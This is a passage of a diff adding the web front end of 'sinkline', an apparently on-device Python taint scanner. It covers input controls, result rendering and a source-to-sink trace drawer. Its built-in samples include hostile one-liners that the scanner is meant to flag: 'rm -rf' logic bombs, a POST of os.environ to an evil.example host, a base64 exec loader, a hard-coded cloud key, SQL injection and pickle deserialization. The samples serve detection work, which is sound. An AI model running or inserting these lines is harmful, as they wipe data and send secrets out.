@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>sinkline — source-to-sink taint for Python</title>
+<!-- the mark: a source dot, a line, a sink block. Inlined — this page loads nothing remote. -->
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%230b1012'/%3E%3Cline x1='7' y1='16' x2='24' y2='16' stroke='%2356c8d8' stroke-width='2.5'/%3E%3Ccircle cx='7' cy='16' r='4' fill='%2356c8d8'/%3E%3Crect x='19' y='11' width='10' height='10' fill='%23ff4a3d'/%3E%3C/svg%3E" />
+<style>
+  /* ------------------------------------------------------------------
+     sinkline — instrument panel
+     Palette: petrol ink + phosphor cyan signal.
+     Severity is an ORDINAL HEAT RAMP: hot = act now, cool = probably noise.
+     Type: monospace leads (labels, data, wordmark), system sans for prose.
+     No webfonts by design — nothing on this page touches the network.
+     ------------------------------------------------------------------ */
+  :root{
+    --ink:#0b1012; --panel:#10171a; --raise:#162024; --sunk:#070b0d;
+    --rule:#223035; --rule-soft:#1a262a;
+    --chalk:#e2eae7; --body:#b9c8c9; --muted:#7d9298;
+    --signal:#56c8d8; --signal-dim:#2c7a87; --signal-wash:rgba(86,200,216,.10);
+
+    /* ordinal severity ramp — hot to cold */
+    --s-crit:#ff4a3d; --s-high:#ff8a3d; --s-med:#e8b92e; --s-low:#7f9aa4; --s-info:#5d757e;
+    --ok:#4fb783;
+
+    --mono:ui-monospace,"SF Mono",SFMono-Regular,"Cascadia Mono","Segoe UI Mono","Roboto Mono",Menlo,Consolas,monospace;
+    --sans:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    --pad:clamp(16px,3vw,30px);
+  }
+  *{box-sizing:border-box}
+  html,body{background:var(--ink)}
+  body{margin:0;color:var(--body);font-family:var(--sans);font-size:14px;line-height:1.55;
+       -webkit-font-smoothing:antialiased}
+  a{color:var(--signal);text-decoration:none;border-bottom:1px solid transparent}
+  a:hover{border-bottom-color:var(--signal-dim)}
+  :focus-visible{outline:2px solid var(--signal);outline-offset:2px;border-radius:2px}
+
+  /* ---- micro-label: the one repeating typographic device ---- */
+  .eyebrow{font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.18em;
+           text-transform:uppercase;color:var(--muted)}
+
+  /* ---- header ---- */
+  header{border-bottom:1px solid var(--rule);background:var(--panel)}
+  .hin{max-width:1180px;margin:0 auto;padding:14px var(--pad);display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+  .wordmark{font-family:var(--mono);font-size:19px;font-weight:700;letter-spacing:-.02em;color:var(--chalk);
+            display:flex;align-items:baseline;gap:3px}
+  .wordmark i{width:8px;height:15px;background:var(--signal);display:inline-block;transform:translateY(1px)}
+  .strap{color:var(--muted);font-size:12.5px}
+  .rail{margin-left:auto;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+  .pill{font-family:var(--mono);font-size:10.5px;letter-spacing:.06em;color:var(--muted);
+        border:1px solid var(--rule);padding:4px 9px}
+  .pill.on{color:var(--signal);border-color:var(--signal-dim)}
+
+  main{max-width:1180px;margin:0 auto;padding:var(--pad) var(--pad) 72px;display:flex;flex-direction:column;gap:26px}
+
+  /* ---- panels: rules, not boxes-in-boxes ---- */
+  .panel{background:var(--panel);border:1px solid var(--rule)}
+  .panel>h2{margin:0;padding:11px 16px;border-bottom:1px solid var(--rule);display:flex;align-items:center;gap:12px;
+            font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.18em;text-transform:uppercase;color:var(--muted)}
+  .pbody{padding:16px}
+
+  /* ---- inputs ---- */
+  .seg{display:flex;border:1px solid var(--rule);width:fit-content;max-width:100%;flex-wrap:wrap;margin-bottom:14px}
+  .seg button{font-family:var(--mono);font-size:11.5px;letter-spacing:.04em;background:transparent;border:0;
+              border-right:1px solid var(--rule);color:var(--muted);padding:8px 15px;cursor:pointer}
+  .seg button:last-child{border-right:0}
+  .seg button[aria-selected="true"]{background:var(--raise);color:var(--chalk);box-shadow:inset 0 -2px 0 var(--signal)}
+  textarea{width:100%;height:236px;resize:vertical;background:var(--sunk);color:var(--chalk);
+           border:1px solid var(--rule);padding:14px;font-family:var(--mono);font-size:13px;line-height:1.6;
+           outline:none;tab-size:4;caret-color:var(--signal)}
+  textarea:focus{border-color:var(--signal-dim)}
+  .drop{border:1px dashed var(--rule);background:var(--sunk);padding:32px 20px;text-align:center;cursor:pointer;
+        transition:border-color .15s;color:var(--muted)}
+  .drop:hover{border-color:var(--signal-dim)}
+  .drop.over{border-color:var(--signal);color:var(--chalk)}
+  .drop b{color:var(--chalk);font-weight:600;display:block;margin-bottom:4px}
+  .pick{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:16px}
+  .note{font-size:11.5px;color:var(--muted)}
+
+  .samples{display:flex;gap:6px;flex-wrap:wrap;margin-top:12px;align-items:center}
+  .samples span#samples{display:flex;gap:6px;flex-wrap:wrap}
+  .samples button{font-family:var(--mono);font-size:11px;background:transparent;border:1px solid var(--rule-soft);
+                  color:var(--muted);padding:4px 9px;cursor:pointer}
+  .samples button:hover{border-color:var(--signal-dim);color:var(--chalk)}
+
+  .controls{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-top:14px}
+  button.act,button.ghost,label.btn{font-family:var(--mono);font-size:12px;letter-spacing:.04em;cursor:pointer;
+    display:inline-block;border:1px solid var(--rule);background:var(--raise);color:var(--chalk);
+    padding:9px 16px;transition:.15s}
+  button.ghost:hover,label.btn:hover{border-color:var(--signal-dim)}
+  button.act{background:var(--signal);border-color:var(--signal);color:#04191d;font-weight:700}
+  button.act:hover{background:#6ad6e4}
+  button:disabled,label.btn[aria-disabled="true"]{opacity:.45;cursor:not-allowed}
+  /* The file inputs are clipped rather than display:none — a clipped input is
+     still focusable, so the keyboard can still reach it through its label. */
+  .vis-hidden{position:absolute;width:1px;height:1px;padding:0;margin:-1px;
+    overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap;border:0}
+  kbd{font-family:var(--mono);font-size:10px;border:1px solid var(--rule);padding:1px 5px;color:var(--muted)}
+  #status{font-family:var(--mono);font-size:11.5px;color:var(--muted)}
+
+  /* ---- verdict: the whole scan as one line ---- */
+  .verdict{border:1px solid var(--rule);background:var(--panel)}
+  .vtop{display:flex;align-items:flex-end;gap:22px;padding:16px 16px 12px;flex-wrap:wrap}
+  .count{font-family:var(--mono);font-size:42px;line-height:.9;font-weight:700;color:var(--chalk);letter-spacing:-.03em}
+  .count.clean{color:var(--ok)}
+  .vstat{display:flex;gap:22px;flex-wrap:wrap;margin-left:auto}
+  .vstat div{min-width:60px}
+  .vstat b{display:block;font-family:var(--mono);font-size:16px;font-weight:700;color:var(--chalk);margin-top:2px}
+  .sevline{display:flex;height:4px;background:var(--rule-soft)}
+  .sevline i{display:block;height:100%}
+  .sevkey{display:flex;gap:16px;flex-wrap:wrap;padding:9px 16px 14px;font-family:var(--mono);font-size:11px;color:var(--muted)}
+  .sevkey b{color:var(--chalk)}
+  .mark{display:inline-block;width:8px;height:8px;margin-right:6px;vertical-align:1px}
+  .demoNote{border-top:1px solid var(--rule);padding:11px 16px;font-size:12.5px;color:var(--body);background:var(--signal-wash)}
+  .demoNote b{color:var(--chalk)}
+
+  /* ---- result tabs ---- */
+  .rtabs{display:flex;gap:0;border-bottom:1px solid var(--rule);overflow-x:auto}
+  .rtabs button[role=tab]{font-family:var(--mono);font-size:11.5px;letter-spacing:.04em;background:transparent;border:0;
+    color:var(--muted);padding:11px 15px;cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;margin-bottom:-1px}
+  .rtabs button[aria-selected="true"]{color:var(--chalk);border-bottom-color:var(--signal)}
+  .rtabs .n{color:var(--muted);margin-left:6px}
+  .pane{display:none;padding:16px} .pane[data-open]{display:block}
+  .lede{font-size:12.5px;color:var(--muted);margin:0 0 14px;max-width:70ch}
+
+  /* ---- findings ---- */
+  .ftools{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:16px}
+  .ftools .chip{font-family:var(--mono);font-size:11px;background:transparent;border:1px solid var(--rule);
+                color:var(--muted);padding:4px 10px;cursor:pointer}
+  .ftools .chip[aria-pressed="true"]{color:var(--chalk);border-color:var(--signal-dim);background:var(--raise)}
+  .ftools label{font-size:12px;color:var(--muted);display:flex;gap:6px;align-items:center;cursor:pointer}
+  .ftools input[type=checkbox]{accent-color:var(--signal)}
+  .shown{margin-left:auto;font-family:var(--mono);font-size:11px;color:var(--muted)}
+
+  .fnd{border:1px solid var(--rule);border-left:3px solid var(--rule);background:var(--panel);padding:14px 16px;margin-bottom:10px}
+  .fnd.muted{opacity:.4}
+  .fhead{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+  .fhead h3{margin:0;font-size:15px;font-weight:600;color:var(--chalk);letter-spacing:-.01em}
+  .sev{font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.1em;padding:3px 7px;text-transform:uppercase}
+  .sev-Critical{background:var(--s-crit);color:#180302}
+  .sev-High{background:var(--s-high);color:#1a0c02}
+  .sev-Medium{background:rgba(232,185,46,.16);color:var(--s-med);box-shadow:inset 0 0 0 1px rgba(232,185,46,.45)}
+  .sev-Low{color:var(--s-low);box-shadow:inset 0 0 0 1px var(--rule)}
+  .sev-Info{color:var(--s-info);box-shadow:inset 0 0 0 1px var(--rule)}
+  .fmeta{display:flex;gap:14px;flex-wrap:wrap;margin:8px 0 0;font-family:var(--mono);font-size:11px;color:var(--muted)}
+  .fmeta a{color:var(--muted);border-bottom:1px solid var(--rule)}
+  .fmeta a:hover{color:var(--signal)}
+  .loc{background:none;border:0;padding:0;font:inherit;color:var(--signal);cursor:pointer;border-bottom:1px solid var(--signal-dim)}
+  .fbtn{margin-left:auto;display:flex;gap:8px}
+  .fbtn button{font-family:var(--mono);font-size:10.5px;background:transparent;border:1px solid var(--rule);
+               color:var(--muted);padding:3px 8px;cursor:pointer}
+  .fbtn button:hover{color:var(--chalk);border-color:var(--signal-dim)}
+  .fnd p{margin:9px 0 0;font-size:13.5px;color:var(--body)}
+  .evid{font-family:var(--mono);font-size:11.5px;color:var(--muted);background:var(--sunk);border:1px solid var(--rule-soft);
+        padding:8px 10px;margin-top:9px;white-space:pre-wrap;overflow-x:auto}
+  .rem{margin-top:9px;font-size:12.5px;color:var(--muted);border-left:2px solid var(--rule);padding-left:10px}
+  .rem b{color:var(--body);font-weight:600}
+  .disclose{font-family:var(--mono);font-size:11px;color:var(--signal);background:none;border:0;padding:6px 0 0;cursor:pointer}
+  .story{display:none;margin-top:8px;border-top:1px solid var(--rule-soft);padding-top:10px}
+  .story[data-open]{display:block}
+  .step{display:flex;gap:12px;margin:6px 0;font-size:12.5px;color:var(--body)}
+  .step span:first-child{font-family:var(--mono);font-size:9.5px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;
+    min-width:82px;color:var(--muted);padding-top:3px}
+
+  /* ---- SIGNATURE: the sinkline — a drawn source→sink trace ---- */
+  .trace{background:var(--sunk);border:1px solid var(--rule-soft);margin-top:12px;padding:6px 0 2px;overflow-x:auto}
+  .trace svg{display:block}
+  .trace .wire{stroke-dasharray:var(--len);stroke-dashoffset:var(--len);animation:draw .9s cubic-bezier(.4,0,.2,1) forwards}
+  @keyframes draw{to{stroke-dashoffset:0}}
+
+  /* ---- code viewer ---- */
+  .cv{background:var(--sunk);border:1px solid var(--rule);overflow:auto;max-height:320px}
+  .cv table{border-collapse:collapse;width:100%;font-family:var(--mono);font-size:12.5px}
+  .cv td{padding:1px 12px;white-space:pre;vertical-align:top;color:var(--body)}
+  .cv td.ln{color:#4a5c63;text-align:right;user-select:none;width:1%;border-right:1px solid var(--rule-soft);padding:1px 10px}
+  .cv tr.hit td{background:rgba(255,74,61,.09)}
+  .cv tr.hit td.ln{border-left:2px solid var(--s-crit);color:var(--s-crit);padding-left:8px}
+  .cv tr.flash td{animation:flash 1.2s ease}
+  @keyframes flash{from{background:var(--signal-wash)}}
+
+  /* ---- misc panes ---- */
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:10px}
+  .cell{border:1px solid var(--rule);background:var(--panel);padding:12px 14px}
+  .cell .n{color:var(--chalk);font-size:13px;font-weight:600}
+  .cell .s{font-family:var(--mono);font-size:11px;color:var(--muted);margin-top:4px}
+  .kv{display:flex;justify-content:space-between;gap:16px;padding:10px 0;border-bottom:1px solid var(--rule-soft);font-size:13px}
+  .kv:last-child{border-bottom:0}
+  .kv b{font-family:var(--mono);color:var(--chalk);font-weight:600}
+  .kv.dim{color:var(--muted)} .kv.dim b{color:var(--muted)}
+  .subhead{margin:20px 0 2px}
+  code.k{font-family:var(--mono);font-size:11.5px;background:var(--raise);padding:1px 6px;color:var(--body)}
+  .empty{text-align:center;padding:44px 16px;color:var(--muted);font-size:13px}
+  .err{border:1px solid var(--s-crit);border-left-width:3px;background:rgba(255,74,61,.08);color:#ffd9d5;padding:12px 14px;font-size:13px}
+  .diff{font-family:var(--mono);font-size:12px;white-space:pre;padding:1px 12px}
+  .diff.add{color:var(--ok)} .diff.del{color:var(--s-crit)} .diff.ctx{color:var(--muted)}
+
+  /* ---- opening state ---- */
+  .hero{border:1px solid var(--rule);background:var(--panel);padding:clamp(26px,5vw,46px) var(--pad)}
+  .hero h1{margin:14px 0 0;font-size:clamp(21px,3.2vw,29px);line-height:1.25;font-weight:600;color:var(--chalk);
+           letter-spacing:-.02em;max-width:24ch}
+  .hero p{margin:14px 0 0;max-width:62ch;font-size:14px}
+
+  .spin{display:inline-block;width:9px;height:9px;background:var(--signal);animation:pulse .9s steps(2,end) infinite;vertical-align:0}
+  @keyframes pulse{50%{opacity:.2}}
+
+  @media (max-width:620px){
+    .vstat{margin-left:0;gap:16px} .count{font-size:34px}
+    .fbtn{margin-left:0;width:100%}
+    .strap{display:none}
+  }
+  @media (prefers-reduced-motion:reduce){
+    *,*::before,*::after{animation-duration:.001ms!important;animation-iteration-count:1!important;transition-duration:.001ms!important}
+    .trace .wire{stroke-dashoffset:0}
+  }
+</style>
+</head>
+<body>
+<header>
+  <div class="hin">
+    <div class="wordmark">sinkline<i></i></div>
+    <div class="strap">source&nbsp;&rarr;&nbsp;sink taint analysis for Python · deterministic · no LLM</div>
+    <div class="rail">
+      <span class="pill" id="enginePill">engines …</span>
+      <span class="pill on">on-device</span>
+      <span class="pill">SARIF 2.1.0</span>
+    </div>
+  </div>
+</header>
+
+<main>
+  <!-- TARGET -->
+  <section class="panel">
+    <h2>Target</h2>
+    <div class="pbody">
+      <div class="seg" role="tablist" aria-label="Input mode">
+        <button role="tab" aria-selected="true" data-tab="paste">paste code</button>
+        <button role="tab" aria-selected="false" data-tab="files">.py files</button>
+        <button role="tab" aria-selected="false" data-tab="folder">folder / .zip</button>
+      </div>
+
+      <div id="t-paste">
+        <label class="eyebrow" for="code" style="display:block;margin-bottom:7px">Python source</label>
+        <textarea id="code" spellcheck="false" placeholder="Paste Python here."></textarea>
+        <div class="samples"><span class="eyebrow">Load a sample</span><span id="samples"></span></div>
+      </div>
+
+      <!-- The pickers are <label for=...>, not buttons calling input.click().
+           A label opens the file dialog through the browser itself, so it works
+           even if this page's JavaScript never runs. -->
+      <div id="t-files" hidden>
+        <div class="drop" id="dropFiles">
+          <b>Drop .py files here</b>
+          <span class="note">Two or more files turn on cross-file taint. 1 MB per file, 6 MB total.</span>
+          <div class="pick"><label class="btn" for="fileInput">Choose files</label></div>
+        </div>
+        <input type="file" id="fileInput" accept=".py,.txt,.toml" multiple class="vis-hidden" />
+      </div>
+
+      <div id="t-folder" hidden>
+        <div class="drop" id="dropFolder">
+          <b>Drop a folder or .zip here</b>
+          <span class="note">Whole-project scan. Skips venv and __pycache__. Up to 300 files.</span>
+          <div class="pick">
+            <label class="btn" for="folderInput" id="pickFolder">Choose folder</label>
+            <label class="btn" for="zipInput">Choose .zip file</label>
+          </div>
+        </div>
+        <input type="file" id="folderInput" webkitdirectory multiple class="vis-hidden" />
+        <input type="file" id="zipInput" accept=".zip" class="vis-hidden" />
+      </div>
+
+      <div class="controls">
+        <button class="act" id="run">Run scan</button>
+        <kbd>Ctrl &crarr;</kbd>
+        <button class="ghost" id="demo">Load demo project</button>
+        <button class="ghost" id="clear">Clear</button>
+        <span id="status" role="status" aria-live="polite"></span>
+      </div>
+    </div>
+  </section>
+
+  <!-- RESULT -->
+  <div id="result" hidden>
+    <section class="verdict" id="verdict"></section>
+    <div id="codeview"></div>
+    <section class="panel" style="margin-top:26px">
+      <div class="rtabs" id="rtabs" role="tablist" aria-label="Result views"></div>
+      <div class="pane" id="pane-findings" data-open></div>
+      <div class="pane" id="pane-flow"></div>
+      <div class="pane" id="pane-fixes"></div>
+      <div class="pane" id="pane-engines"></div>
+      <div class="pane" id="pane-metrics"></div>
+      <div class="pane" id="pane-prov"></div>
+    </section>
+  </div>
+
+  <!-- OPENING -->
+  <section class="hero" id="hero">
+    <span class="eyebrow">What it is for</span>
+    <h1>A secret leaves one file and lands in a sink three files away. Review never catches that.</h1>
+    <p>Sinkline draws the line. It follows tainted data from source to sink across a whole project and
+       reports the path — along with the things a single-file linter has no rule for: logic bombs on a
+       probabilistic trigger, base64 payloads inside a &ldquo;plugin loader&rdquo;, install hooks that fire on
+       <code class="k">pip install</code>, typosquatted dependencies, and keys that only matter because
+       <code class="k">boto3</code> is imported beside them.</p>
+    <p>Every engine is deterministic and runs on this machine. Same input, same result, no network.</p>
+    <div class="controls">
+      <button class="act" id="demo2">Scan the 7-file demo project</button>
+      <span class="note">Six files, nine findings, nothing obvious.</span>
+    </div>
+  </section>
+</main>
+
+<script>
+"use strict";
+const SAMPLES = {
+  "logic bomb":"import random, os\n\n_calls = 0\n\ndef rate_limit(user):\n    # looks like a rate limiter — the trigger is hidden\n    global _calls\n    _calls += 1\n    if random.random() < 0.004 and _calls > 5000:\n        os.system('rm -rf /var/lib/app')\n    return _calls < 100000",
+  "import-correlated key":"import boto3\n\n# only Critical because boto3 is imported right here\nsession = boto3.Session(aws_access_key_id='AKIAZ3GULPBS2P7Q4XYZ')",
+  "probabilistic trigger":"import random, os\nif random.random() < 0.02:\n    os.system('rm -rf /')",
+  "credential exfil":"import os, requests\nrequests.post('https://evil.example/c2', data=os.environ)",
+  "obfuscated payload":"import base64\nexec(base64.b64decode('aW1wb3J0IG9z').decode())",
+  "sql injection":"def get(name):\n    cur.execute(f\"SELECT * FROM users WHERE name = {name}\")",
+  "insecure deserialize":"import pickle\ndef load(blob):\n    return pickle.loads(blob)",
+  "benign":"def add(a, b):\n    return a + b\n\nprint(add(2, 3))",
+};
+const SEV = {Critical:"--s-crit", High:"--s-high", Medium:"--s-med", Low:"--s-low", Info:"--s-info"};
+const ORDER = ["Critical","High","Medium","Low","Info"];
+const MONO = "ui-monospace,SFMono-Regular,Consolas,monospace";
+const SANS = "ui-sans-serif,system-ui,Segoe UI,Roboto,sans-serif";
+const $ = s => document.querySelector(s);
+const $$ = s => [...document.querySelectorAll(s)];
+const cv = n => getComputedStyle(document.documentElement).getPropertyValue(n).trim() || "#888888";
+const sevColor = s => cv(SEV[s] || "--muted");
+const esc = s => (s == null ? "" : "" + s).replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+
+let lastResp = null, mode = "paste", scanCode = null;
+let filters = {sev:"All", hideLow:false, group:false};
+let ignored = new Set(JSON.parse(localStorage.getItem("sinkline_ignored") || "[]"));
+const saveIgnored = () => localStorage.setItem("sinkline_ignored", JSON.stringify([...ignored]));
+
+function download(name, text){
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(new Blob([text], {type:"application/json"}));
+  a.download = name; a.click(); URL.revokeObjectURL(a.href);
+}
+const setStatus = html => { $("#status").innerHTML = html; };
+// Only clears the line when work STARTS. Clearing it on finish wiped every
+// "nothing to scan here" message the instant it was written, which read as
+// the button doing nothing at all.
+const busy = on => { $("#run").disabled = on; if (on) setStatus('<span class="spin"></span> scanning'); };
+
+/* ---------- input mode ---------- */
+$$(".seg button").forEach(b => b.onclick = () => {
+  $$(".seg button").forEach(x => x.setAttribute("aria-selected", String(x === b)));
+  mode = b.dataset.tab;
+  ["paste","files","folder"].forEach(m => { $("#t-" + m).hidden = (m !== mode); });
+});
+
+for (const [name, code] of Object.entries(SAMPLES)){
+  const b = document.createElement("button");
+  b.textContent = name;
+  b.onclick = () => { $("#code").value = code; $("#code").focus(); };
+  $("#samples").appendChild(b);
+}
+
+/* ---------- transport ---------- */
+async function post(url, body, json = true){
+  const opt = {method:"POST"};
+  if (json){ opt.headers = {"Content-Type":"application/json"}; opt.body = JSON.stringify(body); }
+  else { opt.headers = {"Content-Type":"application/octet-stream"}; opt.body = body; }
+  return (await fetch(url, opt)).json();
+}
+const readText = f => new Promise((res, rej) => {
+  const fr = new FileReader(); fr.onload = () => res(fr.result); fr.onerror = rej; fr.readAsText(f);
+});
+
+async function runPaste(){
+  const code = $("#code").value;
+  if (!code.trim()){ setStatus("Nothing to scan — paste some Python first."); return; }
+  scanCode = code; busy(true);
+  try { show(await post("/api/scan", {code})); } finally { busy(false); }
+}
+async function runDemo(){
+  scanCode = null; busy(true);
+  try { const r = await (await fetch("/api/demo")).json(); r._demo = true; show(r); }
+  finally { busy(false); }
+}
+// Source plus dependency manifests — manifests are what the typosquat check reads.
+function scannable(name){
+  const base = (name || "").split(/[\\/]/).pop().toLowerCase();
+  return base.endsWith(".py") || base === "pyproject.toml" || base === "pipfile" ||
+         (base.startsWith("requirements") && base.endsWith(".txt"));
+}
+
+async function runFiles(list){
+  scanCode = null;
+  const all = [...list];
+  const zip = all.find(f => f.name.toLowerCase().endsWith(".zip"));
+  const picked = all.filter(f => scannable(f.webkitRelativePath || f.name));
+  busy(true);
+  try {
+    if (zip){
+      setStatus(`Reading ${zip.name}…`);
+      show(await post("/api/scan-zip", await zip.arrayBuffer(), false));
+      return;
+    }
+    if (!all.length){ setStatus("Nothing was selected."); return; }
+    if (!picked.length){
+      setStatus(`${all.length} file(s) selected, but no Python source or dependency manifest among them.`);
+      return;
+    }
+    setStatus(`Reading ${picked.length} of ${all.length} file(s)…`);
+    const files = {}; let total = 0;
+    for (const f of picked){
+      const t = await readText(f);
+      total += t.length;
+      files[f.webkitRelativePath || f.name] = t;
+    }
+    if (total > 6000000){ setStatus("That selection is over the 6 MB limit. Zip it instead."); return; }
+    setStatus(`Scanning ${picked.length} file(s)…`);
+    show(await post("/api/scan-files", {files}));
+  } catch (err) {
+    setStatus("Could not read that selection — " + err.message);
+  } finally { busy(false); }
+}
+
+$("#run").onclick = () => {
+  if (mode === "paste") return runPaste();
+  if (mode === "files"){
+    const f = $("#fileInput").files;
+    return f.length ? runFiles(f) : setStatus("Choose .py files, or drop them above.");
+  }
+  const f = $("#folderInput").files, z = $("#zipInput").files;
+  if (z.length) runFiles(z);
+  else if (f.length) runFiles(f);
+  else setStatus("Choose a folder or .zip, or drop one above.");
+};
+$("#clear").onclick = () => { $("#code").value = ""; $("#code").focus(); };
+$("#demo").onclick = runDemo;
+$("#demo2").onclick = runDemo;
+// Clearing value first means picking the SAME file twice still fires `change`.
+// The value has to survive the pick itself, though — "Run scan" re-reads
+// input.files to know what to scan, so it is cleared on the way IN, not out.
+function openPicker(id){ const el = $("#" + id); el.value = ""; el.click(); }
+// The inputs live OUTSIDE .drop on purpose: openPicker() clicks them, and from
+// inside .drop that click would bubble back into .drop's own handler and reopen
+// the dialog in a loop.
+["fileInput","folderInput","zipInput"].forEach(id => {
+  $("#" + id).onchange = e => runFiles(e.target.files);
+});
+// The pickers are <label for=...>, so the browser opens the dialog itself and
+// there is nothing to bind. This only adds the same-file-twice reset; with
+// scripting off the pick still works, it just won't re-fire on an identical pick.
+$$("label.btn[for]").forEach(l => {
+  l.onclick = () => { const el = $("#" + l.htmlFor); if (el) el.value = ""; };
+});
+// Safari/iOS can't select folders at all — say so instead of opening a dead dialog.
+// A <label> has no disabled state, so unbind it from the input and mark it ARIA-wise.
+if (!("webkitdirectory" in document.createElement("input"))){
+  const b = $("#pickFolder");
+  b.removeAttribute("for");
+  b.setAttribute("aria-disabled", "true");
+  b.title = "This browser can't select folders — upload a .zip instead";
+}
+[["dropFiles","fileInput"], ["dropFolder","folderInput"]].forEach(([id, input]) => {
+  const d = $("#" + id);
+  // A label click already opens the dialog; without this guard the box handler
+  // would open a second one on top of it.
+  d.onclick = e => { if (!e.target.closest("label")) openPicker(input); };
+  d.ondragover = e => { e.preventDefault(); d.classList.add("over"); };
+  d.ondragleave = () => d.classList.remove("over");
+  d.ondrop = e => { e.preventDefault(); d.classList.remove("over"); runFiles(e.dataTransfer.files); };
+});
+document.addEventListener("keydown", e => {
+  if ((e.ctrlKey || e.metaKey) && e.key === "Enter"){ e.preventDefault(); $("#run").click(); }
+});
+
+/* ---------- render ---------- */
+function show(resp){
+  lastResp = resp;
+  $("#hero").hidden = true;
+  $("#result").hidden = false;
+  if (!resp.ok){
+    $("#verdict").innerHTML = `<div class="err">Scan failed — ${esc(resp.error)}</div>`;
+    $("#codeview").innerHTML = ""; $("#rtabs").innerHTML = "";
+    $$(".pane").forEach(p => { p.innerHTML = ""; });
+    setStatus(""); return;
+  }
+  renderVerdict(resp); renderCode(resp); renderTabs(resp); renderFindings();
+  setStatus("");
+}
+
+function renderVerdict(r){
+  const s = r.summary, total = s.total || 0, by = s.by_severity || {};
+  const present = ORDER.filter(k => by[k]);
+  const bar = present.map(k => `<i style="flex:${by[k]};background:${sevColor(k)}"></i>`).join("")
+            || `<i style="flex:1;background:var(--ok)"></i>`;
+  const key = present.map(k =>
+      `<span><span class="mark" style="background:${sevColor(k)}"></span><b>${by[k]}</b> ${k.toLowerCase()}</span>`).join("")
+    || `<span><span class="mark" style="background:var(--ok)"></span>clean</span>`;
+  const gate = (by.Critical || by.High) ? "fail" : "pass";
+  const topColor = total ? sevColor(present[0]) : "var(--ok)";
+
+  const demo = r._demo ? `<div class="demoNote"><b>Demo — a 7-file analytics service.</b>
+    Every file is plausible on its own. Together they hold a credential leak split across three modules, a logic bomb
+    inside the rate limiter, a base64 plugin loader, an import-correlated AWS key, an install hook, and a typosquatted
+    dependency. Open <b>attack paths</b> to see each line drawn end to end.</div>` : "";
+
+  $("#verdict").innerHTML = `
+    <div class="vtop">
+      <div>
+        <span class="eyebrow">Findings</span>
+        <div class="count ${total ? "" : "clean"}">${total}</div>
+      </div>
+      <div class="vstat">
+        <div><span class="eyebrow">Files</span><b>${s.files_scanned}</b></div>
+        <div><span class="eyebrow">Peak CVSS</span><b style="color:${topColor}">${(s.max_cvss || 0).toFixed(1)}</b></div>
+        <div><span class="eyebrow">Scan</span><b>${s.duration_ms}<span style="font-size:11px;color:var(--muted)"> ms</span></b></div>
+        <div><span class="eyebrow">AST entropy</span><b>${s.ast_entropy}</b></div>
+        <div><span class="eyebrow">CI gate</span><b style="color:${gate === "fail" ? sevColor("Critical") : "var(--ok)"}">${gate}</b></div>
+      </div>
+    </div>
+    <div class="sevline">${bar}</div>
+    <div class="sevkey">${key}
+      <span style="margin-left:auto">reachability <b style="color:${r.symbolic_unsafe ? sevColor("High") : "var(--ok)"}">${esc(r.symbolic || "n/a")}</b></span>
+    </div>${demo}`;
+}
+
+function renderCode(r){
+  const host = $("#codeview");
+  if (!scanCode){ host.innerHTML = ""; return; }
+  const hits = new Set(r.findings.filter(f => f.artifact_uri === "snippet" || !f.artifact_uri).map(f => f.line));
+  const rows = scanCode.split("\n").map((ln, i) => {
+    const n = i + 1;
+    return `<tr id="L${n}"${hits.has(n) ? ' class="hit"' : ""}><td class="ln">${n}</td><td>${esc(ln) || " "}</td></tr>`;
+  }).join("");
+  host.innerHTML = `<div style="margin-top:26px"><span class="eyebrow" style="display:block;margin-bottom:8px">Source under scan</span>
+    <div class="cv"><table>${rows}</table></div></div>`;
+}
+function jumpTo(line){
+  const row = $("#L" + line); if (!row) return;
+  row.scrollIntoView({block:"center", behavior:"smooth"});
+  row.classList.remove("flash"); void row.offsetWidth; row.classList.add("flash");
+}
+
+/* ---------- SIGNATURE: draw the sinkline for one finding ---------- */
+function wrap(text, max, maxLines){
+  const words = (text || "").split(/\s+/); const out = []; let cur = "";
+  for (const w of words){
+    if ((cur + " " + w).trim().length > max){ out.push(cur.trim()); cur = w; } else cur += " " + w;
+  }
+  if (cur.trim()) out.push(cur.trim());
+  if (out.length > maxLines){ out.length = maxLines; out[maxLines - 1] = out[maxLines - 1].slice(0, max - 1) + "…"; }
+  return out;
+}
+function sinklineTrace(f, id){
+  const steps = (f.narrative || []).filter(s => !/^Evidence/i.test(s));
+  const n = Math.min(steps.length, 3);
+  if (n < 1) return "";
+  const LABELS = ["SOURCE","PROPAGATION","SINK"];
+  const GAP = 252, X0 = 26, Y = 42, H = 132;
+  const W = X0 + (n - 1) * GAP + 236;
+  const hot = sevColor(f.severity), cool = cv("--signal"), len = (n - 1) * GAP;
+
+  let marks = "", text = "";
+  for (let i = 0; i < n; i++){
+    const x = X0 + i * GAP, isSink = (i === n - 1 && n > 1), col = isSink ? hot : cool;
+    // shape-coded as well as colour-coded: ● source · ◆ hop · ■ sink
+    marks += i === 0
+      ? `<circle cx="${x}" cy="${Y}" r="6" fill="${col}"/>`
+      : isSink
+        ? `<rect x="${x - 6}" y="${Y - 6}" width="12" height="12" fill="${col}"/>`
+        : `<rect x="${x - 6}" y="${Y - 6}" width="12" height="12" fill="${col}" transform="rotate(45 ${x} ${Y})"/>`;
+    const body = (steps[i].split("—").slice(1).join("—") || steps[i]).trim();
